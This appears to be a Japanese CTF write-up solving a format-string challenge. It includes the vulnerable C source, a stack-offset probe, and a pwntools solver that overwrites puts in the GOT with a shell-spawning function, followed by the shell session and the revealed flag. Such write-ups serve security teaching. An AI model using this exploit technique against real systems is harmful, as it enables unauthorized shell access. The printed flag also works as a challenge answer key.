# got_shell:Pwn:150pts
難易度：★★★  
人類の95%が解けない(適当)。解けたらIQ200 (2時間あれば作問できるだろ！となめてかかったら環境整えるのに滅茶苦茶かかりました！ごめんなさい。)  
```
nc kogctf.com 20917
```
flagは/home/got_shell内にあります  

[chall.tar.gz](chall.tar.gz)  

# Solution
人類の95%が解けないらしい…。  
配布されていた実行ファイルはELF 32-bitであり、チェック機構がある程度ついている。  
```bash
$ file got_shell
got_shell: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, not stripped
$ checksec --file=got_shell
[*] '/got_shell'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
配布されていたソースは以下のようであった。  
```c
#include <stdio.h>
#include <stdlib.h>

void win()
{
    system("/bin/sh");
}

void vuln()
{
    char buf[64];
    printf("Why you wanna shell? ");
    fgets(buf, 64, stdin);
    printf(buf);
    puts("Hmm...Good bye!");
    return;
}

int main()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```
どう考えてもFSBである。  
```bash
$ nc kogctf.com 20917
Why you wanna shell? AAAA%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
AAAA0x40,0xf7f6d5c0,0xf7dc7da0,0xf7f6dd40,(nil),(nil),0xffc78e3c,0xffc78e3c,0x15,0x804c000,0x41414141,0x252c7025,0x70252c70,0x2c70252c,0x252c7025
Hmm...Good bye!
```
`win`なるイイ関数があるので、GOT overwriteで呼び出してやればよい。  
以下のsolver.pyでシェルを奪う。  
```python
from pwn import *

HOST = "kogctf.com"
PORT = 20917

elf = ELF("./got_shell")
got_puts = elf.got[b"puts"]
sym_win = elf.symbols[b"win"]

payload = fmtstr_payload(11, {got_puts: sym_win})

r = remote(HOST, PORT)
r.recvuntil(b"Why you wanna shell? ")
r.sendline(payload)

r.interactive()
```
実行する。
```bash
$ python solver.py
~~~
$ id
uid=1000(got_shell) gid=1000(got_shell) groups=1000(got_shell)
$ ls /home/got_shell
flag.txt
got_shell
$ cat /home/got_shell/flag.txt
KogCTF2023{f0rm4t_n_1s_d4ng3r0us}
```
flag.txtにflagが書かれていた。  

## KogCTF2023{f0rm4t_n_1s_d4ng3r0us}